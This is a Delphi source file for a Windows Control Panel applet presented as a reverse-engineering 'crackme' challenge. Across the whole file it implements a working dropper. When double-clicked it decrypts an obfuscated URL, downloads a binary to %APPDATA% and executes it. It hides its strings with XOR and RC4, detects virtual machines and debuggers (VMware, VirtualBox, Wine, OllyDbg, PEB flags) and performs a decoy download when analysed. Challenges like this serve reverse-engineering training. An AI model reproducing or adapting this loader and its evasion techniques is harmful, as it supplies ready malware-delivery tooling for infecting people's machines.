library CPLcrackme;

// First version: 19 oct 2015

uses
  System.SysUtils,
  System.Classes,
  Windows,
  Wininet,
  Messages,
  shlobj,
  tlhelp32,
  StrUtils,
  Wcrypt2 in 'Wcrypt2.pas';

{$E cpl}
{$R cplRes.RES}

//***************
//** CPL CONST **
//***************

const NUM_APPLETS = 1;

const CPL_DYNAMIC_RES = 0;

const CPL_INIT = 1;
const CPL_GETCOUNT = 2;
const CPL_INQUIRE = 3;
const CPL_SELECT = 4;
const CPL_DBLCLK = 5;
const CPL_STOP = 6;
const CPL_EXIT = 7;
const CPL_NEWINQUIRE = 8;
const CPL_STARTWPARMS = 9;
const CPL_SETUP = 200;

//******************
//** CUSTOM CONST **
//******************

// Encrypted with hardcoded key
const URL_TROLL = 'D16DAC73BAC4B2D466D239FC23C9CE7891AB8CDB7CBEA043F25287C36FD5072CD81946F36E89AE2CA4598AB97F9E8F8AE259B1B2BDB5DD58C1A44C8ACE6C95A95285ABEC0F34A3';
const FILENAME_TROLL = '17D00E2FC8052BAD83A62FCE';
const FILENAME = '2F3FC767F10DC22E2D104D9D56';
const RESOURCE_NAME = 'AD50E74DFA60F20D67D3';
const VMWARE_FLAG = 'AB9880E440B4A8D554C7';
const VMWARE_PORT = 'EF433539375F';
const NTDLL = '1BDE1ED064E04E87AB53';
const WINE1 = '7FA146E61544EA6581AB1A27CC19BA6083';
const WINE2 = '81AF5490AC3CEB55EC2AA1599B5384B65B95AB2CA651F2062ABF';
const VBOX = '55FC72B375F81FA443E77380FB3888A7';
const OLLYNAME = 'E364FD18285CDF12';
const NTQUERYINFPROC = '6BEE2E2DFB5182CE40E574BB7BB12BD572B571F55F99B145E165';

// Encrypted with key loaded from a resource
const URL = '83A44FF33DF46BDD5A90B5134F8ABAD076A13E2BAB53C87BB5D6084099F2062ABA59F629C7C5093CF66BEC07339E4BF87AB34FEB15C3AB5E80D5';

// Password to decrypt resource. Hardcoded as bait
const PASSWORD = 'P@ssw0rdS3cr3t!';

//*****************
//** GLOBAL VARS **
//*****************

var
  keys: array [0..1] of string;

//*****************
//** TYPES       **
//*****************

type TCplInfo = record
       idIcon : integer;
       idName : integer;
       idInfo : integer;
       lData : LongInt;
     end;
     PCplInfo = ^TCplInfo;

type TNewCplInfoA = record
       dwSize : DWORD;
       dwFlags : DWORD;
       dwHelpContext : DWORD;
       lData : LongInt;
       IconH : HIcon;
       szName : array [0..31] of char;
       szInfo : array [0..63] of char;
       szHelpFile : array [0..127] of char;
     end;
     PNewCplInfoA = ^TNewCplInfoA;

type TNewCplInfoW = record
       dwSize : DWORD;
       dwFlags : DWORD;
       dwHelpContext : DWORD;
       lData : LongInt;
       IconH : HIcon;
       szName : array [0..31] of WChar;
       szInfo : array [0..63] of WChar;
       szHelpFile : array [0..127] of WChar;
     end;
     PNewCplInfoW = ^TNewCplInfoW;

type TNewCplInfo = TNewCplInfoA;
type PNewCplInfo = ^TNewCplInfoA;

//******************************
//** PROCEDURES AND FUNCTIONS **
//******************************

function IsRunningVirtualized(): Boolean; forward;
Procedure TrollDownload(); forward;
function CheckForDebugger() : Boolean; forward;

//************************************
//** DownloadFile                   **
//************************************
//** Download a file from a URL     **
//** and save to Path               **
//************************************
procedure DownloadFile(URL: string; Path: string);
const
  BLOCK_SIZE = 1024;

var
  InetHandle: Pointer;
  URLHandle: Pointer;
  FileHandle: Cardinal;
  BytesRead: Cardinal;
  DownloadBuffer: Pointer;
  Buffer: array [1 .. BLOCK_SIZE] of byte;
  BytesWritten: Cardinal;

begin
  InetHandle := InternetOpen(PWideChar(URL), 0, 0, 0, 0);
  if not Assigned(InetHandle) then Abort();
  try
    URLHandle := InternetOpenUrl(InetHandle, PWideChar(URL), 0, 0, 0, 0);
    if not Assigned(URLHandle) then Abort();
    try
      FileHandle := CreateFile(PWideChar(Path), GENERIC_WRITE, FILE_SHARE_WRITE, 0,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      if FileHandle = INVALID_HANDLE_VALUE then Abort();
      try
        DownloadBuffer:= @Buffer;
        repeat
          if (not InternetReadFile(URLHandle, DownloadBuffer, BLOCK_SIZE, BytesRead)
             or (not WriteFile(FileHandle, DownloadBuffer^, BytesRead, BytesWritten, 0))) then
            Abort();
        until BytesRead = 0;
      finally
        CloseHandle(FileHandle);
      end;
    finally
      InternetCloseHandle(URLHandle);
    end;
  finally
    InternetCloseHandle(InetHandle);
  end;
end;

//************************************
//** GetPathToFolder                **
//************************************
//** Get path to a system folder,   **
//** specified by CSIDL number      **
//************************************
function GetPathToFolder(folder: Integer): string;
var
  Path: array [0..MAX_PATH] of char;

begin
  FillChar(Path, SizeOf(Path), #0);

  if not SHGetSpecialFolderPath(0, PChar(@Path[0]), folder, false) then
    Abort();

  Result:= Path;

end;


//************************************
//** IsCharHex                      **
//************************************
//** Checks if a char is part       **
//** of hex alphabet                **
//** >> 0..9   A..F                 **
//************************************
function IsCharHex(C: Char): Boolean;
begin
  Result:= CharInSet(C, ['0'..'9', 'A'..'F']);
end;


//************************************
//** ValidateCiphertext             **
//************************************
//** Checks that a string only      **
//** contains hex characters,       **
//** all of them uppercase          **
//************************************
function ValidateCiphertext(ciphertext: string) : Boolean;
var
  C: Char;
begin
  Result:= True;

  for C in ciphertext do
    if not IsCharHex(C) then
    begin
      Result := False;
      break;
    end;
end;


//************************************
//** DecryptString                  **
//************************************
//** Decryption key is chosen from  **
//** a global variable with an      **
//** array of keys, by index        **
//**                                **
//** NOTE: contains hidden          **
//** anti-vm and anti-debug         **
//************************************
function DecryptString(const ciphertext: string; index: Integer): string;
var
  key, plain: string;
  sub, xor1, xor2, key_index, ciphertext_index, key_length: Byte;
  temp_char: Word;

begin
  if (not ValidateCiphertext(ciphertext)) or (Length(ciphertext) < 5) then
    Abort;

  if (index < 0) or (index > 1) then
    Abort;

  plain:= '';
  key:= keys[index];
  key_length:= Length(key);
  if key_length < 1 then
    Abort;

  key_index:= 0;
  sub:= StrToInt('$' + Copy(ciphertext, 1, 2));
  ciphertext_index:= 3;

  repeat
    xor2:= StrToInt('$' + Copy(ciphertext, ciphertext_index, 2));

    //It starts over after reaching the last char of the key
    if key_index >= key_length then
    begin
      key_index:= 1;

      //Anti-VM and anti-debug check here
      //only for legit URL
      if index = 1 then
        if IsRunningVirtualized() or CheckForDebugger() then
        begin
          TrollDownload();
          Abort;
        end;
    end
    else
      key_index:= key_index + 1;

    xor1:= Ord(Copy(key, key_index, 1)[1]);
    temp_char:= xor1 Xor xor2;

    if temp_char < sub then temp_char:= temp_char + 255;

    plain:= plain + Chr(temp_char - sub);
    sub:= xor2;
    ciphertext_index:= ciphertext_index + 2;
  until ciphertext_index > Length(ciphertext);

  Result:= plain;
end;

//************************************
//** TrollDownload                  **
//************************************
//** Bogus download.                **
//** It is used when virtualization **
//** is detected, for example       **
//************************************
Procedure TrollDownload();
var
  path: string;

begin
  path := GetPathToFolder(CSIDL_DESKTOPDIRECTORY) + '\' + DecryptString(FILENAME_TROLL, 0);
  DownloadFile(DecryptString(URL_TROLL, 0), path);
end;

//************************************
//** IsRunningVMWare                **
//************************************
//** Detects VMWare.                **
//** Flag and port are not          **
//** hardcoded **
//************************************
function IsRunningVMWare(flag: Integer; port: Word): Boolean;
// flag = $564D5868
// port = $5658

var
  rc: Boolean;

begin
  rc := True;
  try
    asm
      push edx
      push ecx
      push ebx

      mov eax, flag
      mov ebx, 0
      mov ecx, 0Ah
      mov dx, port

      in eax, dx

      cmp ebx, flag
      setz [rc]

      pop ebx
      pop ecx
      pop edx
    end;
  except
      rc:= False;
  end;

  Result:= rc;

end;

//************************************
//** IsRunningWine                  **
//************************************
//** Detects Wine environment.      **
//** Strings are passed to the      **
//** function, to avoid hardcoding  **
//************************************
function IsRunningWine(lib: string; getVersion: string; ntToUnix: string): Boolean;
// lib = 'ntdll.dll'
// getVersion = 'wine_get_version'
// ntToUnix = 'wine_nt_to_unix_file_name'

type
  TWineGetVersion = function: PAnsiChar;{$IFDEF Win32}stdcall;{$ENDIF}
  TWineNTToUnixFileName = procedure (P1: Pointer; P2: Pointer);{$IFDEF Win32}stdcall;{$ENDIF}

var
  LHandle: THandle;
  LWineGetVersion: TWineGetVersion;
  LWineNTToUnixFileName: TWineNTToUnixFileName;

begin
  Result:= False;
  LHandle := LoadLibrary(PWideChar(lib));
  if LHandle > 32 then begin
    LWineGetVersion := GetProcAddress(LHandle, PWideChar(getVersion));
    LWineNTToUnixFileName := GetProcAddress(LHandle, PWideChar(ntToUnix));
    if Assigned(LWineGetVersion) or Assigned(LWineNTToUnixFileName) then Result:= True;

    FreeLibrary(LHandle);
  end;
end;

//************************************
//** IsRunningVirtualBox            **
//************************************
//** Detects VirtualBox             **
//**                                **
//************************************
function IsRunningVirtualBox(process: string): Boolean;
// process = 'VBoxService.exe'

var
  handle: THandle;
  procinfo: ProcessEntry32;

begin
  Result:= False;
  try
    handle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    try
      while(Process32Next(handle, procinfo)) do begin
      if POS(PWideChar(process), procinfo.szExeFile) > 0 then begin
        Result:= True;
        Break;
      end;
    end;
    finally
      CloseHandle(handle);
    end;
  except
  end;
end;

//************************************
//** IsRunningVirtualized           **
//************************************
//** Combines detection functions   **
//**                                **
//************************************
function IsRunningVirtualized(): Boolean;

begin
  if not IsRunningVMWare(StrToInt(DecryptString(VMWARE_FLAG, 0)), StrToInt(DecryptString(VMWARE_PORT, 0))) then
    if not IsRunningWine(DecryptString(NTDLL, 0), DecryptString(WINE1, 0), DecryptString(WINE2, 0)) then
      if not IsRunningVirtualBox(DecryptString(NTDLL, 0)) then
        Result:= False
      else
        Result:= True
    else
      Result:= True
  else
    Result:= True
end;


//************************************
//** CheckOlly                      **
//************************************
//** Checks for OllyDbg window      **
//**                                **
//************************************
function CheckOlly(windowname: string) : Boolean;
var
  Hwnd: Thandle;
begin
  Hwnd:= FindWindow(PChar(windowname), nil);
  if Hwnd <> 0 then
    Result:= True
  else
    Result:= False;
end;


//************************************
//** CheckBeingDebugged             **
//************************************
//** Checks BeingDebugged flag      **
//** in PEB                         **
//************************************
function CheckBeingDebugged() : Boolean;
var
  checkvar: Integer;
begin
  checkvar:= 0;
  asm
    push edx

    push dword ptr fs:[30h]
    pop edx
    //Check BeingDebugged Flag
    cmp byte ptr [edx+2], 1
    jne @No
    mov checkvar, 1

    @No:
    pop edx
  end;
  if checkvar = 1 then
    Result:= True
  else
    Result:= False;
end;


//************************************
//** CheckProcessHeapFlag           **
//************************************
//** Checks ProcessHeap flag        **
//** in PEB.                        **
//** NEEDS REVISION! NOT WORKING    **
//** IT ALWAYS RETURNS TRUE         **
//************************************
function CheckProcessHeapFlag() : Boolean;
var
  checkvar: Integer;
begin
  checkvar:= 0;
  asm
    push eax

    mov eax, fs:[30h]
    mov eax, [eax+18h]
    mov eax, [eax+10h]
    test eax, eax
    je @No
    mov checkvar, 1

    @No:
    pop eax
  end;
  if checkvar = 1 then
    Result:= True
  else
    Result:= False;
end;


//************************************
//** CheckNTGlobalFlag              **
//************************************
//** Checks NTGlobalFlag            **
//** in PEB                         **
//************************************
function CheckNTGlobalFlag() : Boolean;
var
  checkvar: Integer;
begin
  checkvar:= 0;
  asm
    push eax

    mov eax, large fs:30h
    cmp dword ptr ds:[eax+68h], 70h
    jnz @No
    mov checkvar, 1

    @No:
    pop eax
  end;
  if checkvar = 1 then
    Result:= True
  else
    Result:= False;
end;

//************************************
//** AntiDebugCheckPEB              **
//************************************
//** Anti-debug checks              **
//** -BeingDebugged flag            **
//** -NTGlobalFlag (offset 0x68)    **
//************************************
function AntiDebugCheckPEB() : Boolean;
begin
  Result:= CheckBeingDebugged() or CheckNTGlobalFlag();
end;


//************************************
//** CheckNtQueryInformationProcess **
//************************************
//** Calls NtQueryInformationProc   **
//** in ntdll.dll. It uses          **
//** GetProcAddress to perform the  **
//** call.                          **
//** The value of ProcessDebugPort  **
//** is checked. If not zero,       **
//** there's a debugger present     **
//************************************
function CheckNtQueryInformationProcess(ntdll, name: string): Boolean;
// ntdll = 'ntdll.dll'
// name = 'NtQueryInformationProcess'
type
  TNtQIP = function(h: THandle; pic: LongWord; pi: Pointer; pil: LongWord; rl: Pointer): LongWord;{$IFDEF Win32}stdcall;{$ENDIF}

var
  LHandle: THandle;
  LNtQIP: TNtQIP;
  retCode: LongWord;
  isdebugged: LongWord;

begin
  Result:= False;

  try
    LHandle := LoadLibrary(PChar(ntdll));

      try
        LNtQIP := GetProcAddress(LHandle, PChar(name));
        if Assigned(LNtQIP) then
        begin
          retCode:= LNtQIP(GetCurrentProcess(), 7, @isdebugged, 4, 0);
          if (retCode = 0) and (isdebugged <> 0) then
            Result:= True;
        end;

        FreeLibrary(LHandle);
      except
        FreeLibrary(LHandle);
      end;

  except
  end;
end;


//************************************
//** CheckForDebugger               **
//************************************
//** Combines anti-debug checks     **
//**                                **
//************************************
function CheckForDebugger() : Boolean;
begin
  if not CheckOlly(DecryptString(OLLYNAME, 0)) then
    if not AntiDebugCheckPEB() then
      if not CheckNtQueryInformationProcess(DecryptString(NTDLL, 0), DecryptString(NTQUERYINFPROC, 0)) then
        Result:= False
      else
        Result:= True
    else
      Result:= True
  else
    Result:= True

end;


//************************************
//** DecryptStream                  **
//************************************
//** Decrypts a stream.             **
//** In this case, RC4 has been     **
//** used, but the code could be    **
//** modified so that the algorithm **
//** is a parameter                 **
//**                                **
//** NOTE: contains hidden          **
//** anti-vm and anti-debug         **
//************************************
procedure DecryptStream(const inStream: TStream;  outStream: TStream; Password: string);
var
  hProv: HCRYPTPROV;
  hash: HCRYPTHASH;
  key: HCRYPTKEY;

  Buffer: PByte;
  len: dWord;
  IsEndOfFile: Boolean;
begin
  //Get context for crypt default provider
  CryptAcquireContext(@hProv, nil, nil, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
  //Create hash-object (SHA algorithm)
  CryptCreateHash(hProv, CALG_SHA, 0, 0, @hash);
  //Get hash from password
  CryptHashData(hash, @Password[1], Length(Password), 0);
  //Create key from hash by RC4 algorithm
  CryptDeriveKey(hProv, CALG_RC4, hash, 0, @key);
  //Destroy hash-object
  CryptDestroyHash(hash);

  try
    //Allocate buffer to read content from input stream
    GetMem(Buffer, 512);

    repeat
      IsEndOfFile := (inStream.Position >= inStream.Size);
      if IsEndOfFile then break;

      //Read content from input stream
      len := inStream.Read(Buffer^, 512);

      //Hidden anti-vm and anti-debug
      if inStream.Position = 512 then
        if IsRunningVirtualized() or CheckForDebugger() then
        begin
          TrollDownload();
          Abort;
        end;

      //Decrypt buffer
      CryptDecrypt(key, 0, IsEndOfFile, 0, Buffer, @len);

      //Write changed buffer to out stream
      outStream.Write(Buffer^, len);
    until IsEndOfFile;

  finally
    //Release Memory
    FreeMem(Buffer, 512);
    //Release the context for crypt default provider
    CryptReleaseContext(hProv, 0);
  end;

end;


//************************************
//** XorStream                      **
//************************************
//** One-byte XORs a stream of data **
//**                                **
//************************************
Procedure XorStream(buffer: TStream; xorChar: Byte);
var
  auxBuffer: PByte;
  len, pos: dWord;
  IsEndOfFile: Boolean;
  i: integer;

begin
  buffer.Seek(0, soFromBeginning);

  try
    //allocate buffer to read content from input stream
    GetMem(auxBuffer, 512);

    repeat
      IsEndOfFile := (buffer.Position >= buffer.Size);
      if IsEndOfFile then break;

      //read content from input stream
      len := buffer.Read(auxBuffer^, 512);

      pos:= buffer.Position;
      for i := 0 to len-1 do
      begin
        buffer.Seek(pos-len+i, soFromBeginning);
        auxBuffer[i] := auxBuffer[i] Xor xorChar;
        buffer.Write(auxBuffer[i], 1);
      end;

    until IsEndOfFile;

  finally
    FreeMem(auxBuffer, 512);
  end;

end;


//************************************
//** ExtractBetween                 **
//************************************
//** Extracts substring between     **
//** delimiters.                    **
//************************************
function ExtractBetween(const Value, A, B: string): string;
var
  aPos, bPos: Integer;
begin
  result := '';
  aPos := Pos(A, Value);
  if aPos > 0 then begin
    aPos := aPos + Length(A);
    bPos := PosEx(B, Value, aPos);
    if bPos > 0 then begin
      result := Copy(Value, aPos, bPos - aPos);
    end;
  end;
end;


//************************************
//** GetKeyFromResource             **
//************************************
//** Get the main decryption key    **
//** (to decrypt download URL) and  **
//** store it in a global var.      **
//**                                **
//** NOTES:                         **
//** -Key is ascii                  **
//** -In between a lot of garbage   **
//**  ascii                         **
//** -Delimited between '3537'      **
//** -Then XORed with 0x3F          **
//** -And encrypted with RC4        **
//** -That is stored as a resource  **
//************************************
Procedure GetKeyFromResource(const name: string);
var
  res: TResourceStream;
  buf: TMemoryStream;
  str: string;

begin
  buf:= TMemoryStream.Create();

  //Get resource
  res:= TResourceStream.Create(HInstance, name, RT_RCDATA);

  try
    //Decrypt resource
    DecryptStream(res, buf, PASSWORD);

    //XOR buffer
    XorStream(buf, 63);

    //Convert to string
    SetString(str, PAnsiChar(buf.Memory), buf.Size);

    //Get the key between delimiters
    //and save it to a global var
    keys[1] := ExtractBetween(str, '3537', '3537');
    if keys[1] = '' then
      Abort();

  finally
    FreeAndNil(buf);
    FreeAndNil(res);
  end;

end;


//************************************
//** ExecuteProcess                 **
//************************************
//** Executes a new process for     **
//** specified file                 **
//************************************
procedure ExecuteProcess(path: String);
var
  StartInfo: TStartupInfo;
  ProcInfo: TProcessInformation;
  OK: Boolean;

begin
  FillChar(StartInfo,SizeOf(TStartupInfo),#0);
  FillChar(ProcInfo,SizeOf(TProcessInformation),#0);
  StartInfo.cb := SizeOf(TStartupInfo);

  OK:= CreateProcess(PChar(path), nil, nil, nil, False, CREATE_NEW_PROCESS_GROUP+NORMAL_PRIORITY_CLASS, nil, nil, StartInfo, ProcInfo);

  if not OK then
    Abort;

  CloseHandle(ProcInfo.hProcess);
  CloseHandle(ProcInfo.hThread);
end;


//************************************
//** GoChallenge                    **
//************************************
//** Main procedure.                **
//** Downloads and executes         **
//** another binary                 **
//************************************
procedure GoChallenge();
var
  roamingPath, exePath: string;
  size: Double;
  buf: PByte;

begin
  try
    //Get decryption key for download URL (which is encrypted)
    GetKeyFromResource(DecryptString(RESOURCE_NAME, 0));

    //Build download path
    //%APPDATA%
    roamingPath := GetPathToFolder(CSIDL_APPDATA);
    exePath := roamingPath + '\' + DecryptString(FILENAME, 0);

    //Download binary
    DownloadFile(DecryptString(URL, 1), exePath);

    //Execute it
    ExecuteProcess(exePath);
  except
    Sleep(5000);
  end;
end;


//************************************
//** Launcher                       **
//************************************
//** Launches challenge             **
//**                                **
//************************************
Procedure Launcher();
var
  urlt: string;
begin
  //Key to decrypt most strings
  keys[0]:= 'WMRY0A5XK8XUY8JMTU47';

  //Only executes GoChallenge when running under Wine.
  //This check is meant to be patched or bypassed.
  //Wine strings are in plain to make it easier to spot while reversing.
  if IsRunningWine('ntdll.dll', 'wine_get_version', 'wine_nt_to_unix_file_name') then
    GoChallenge()
  else
    try
      TrollDownload();
    except
      Sleep(5000);
    end;
end;


//************************************
//** CPlApplet                      **
//************************************
//** Main export for                **
//** CPL executables                **
//************************************
function CPlApplet(hWndCPL : hWnd;
                   iMessage : integer;
                   lParam1 : longint;
                   lParam2 : longint) : LongInt stdcall;
begin

  case iMessage of
    CPL_INIT : begin
      Result := 1;
      exit;
    end;
    CPL_GetCount : begin
      Result := NUM_APPLETS;
      exit;
    end;
    CPL_Inquire : begin
      PCplInfo(lParam2)^.idIcon := 2;
      PCplInfo(lParam2)^.idName := 1;
      PCplInfo(lParam2)^.idInfo := 2;
      PCplInfo(lParam2)^.lData := 0;
      Result := 1;
      exit;
    end;
    CPL_NewInquire : begin
      PNewCplInfo(lParam2)^.dwSize := sizeof(TNewCplInfo);
      PNewCplInfo(lParam2)^.dwHelpContext := 0;
      PNewCplInfo(lParam2)^.lData := 0;
      PNewCplInfo(lParam2)^.IconH := LoadIcon(hInstance,
                                              MakeIntResource(2));
      lStrCpy(@PNewCplInfo(lParam2)^.szName, 'Easy Challenge');
      lStrCpy(PNewCplInfo(lParam2)^.szInfo, 'Piece of cake, human!');
      PNewCplInfo(lParam2)^.szHelpFile[0] := #0;
      Result := 1;
      exit;
    end;
    CPL_SELECT : begin
      Result := 0;
      exit;
    end;
    CPL_DBLCLK : begin
      Launcher();

      Result := 1;
      exit;
    end;
    CPL_STOP : begin
      Result := 0;
      exit;
    end;
    CPL_EXIT : begin
      Result := 0;
      exit;
    end else begin
      Result := 0;
      exit;
    end;
  end;
end;

exports CPlApplet name 'CPlApplet';

begin
end.
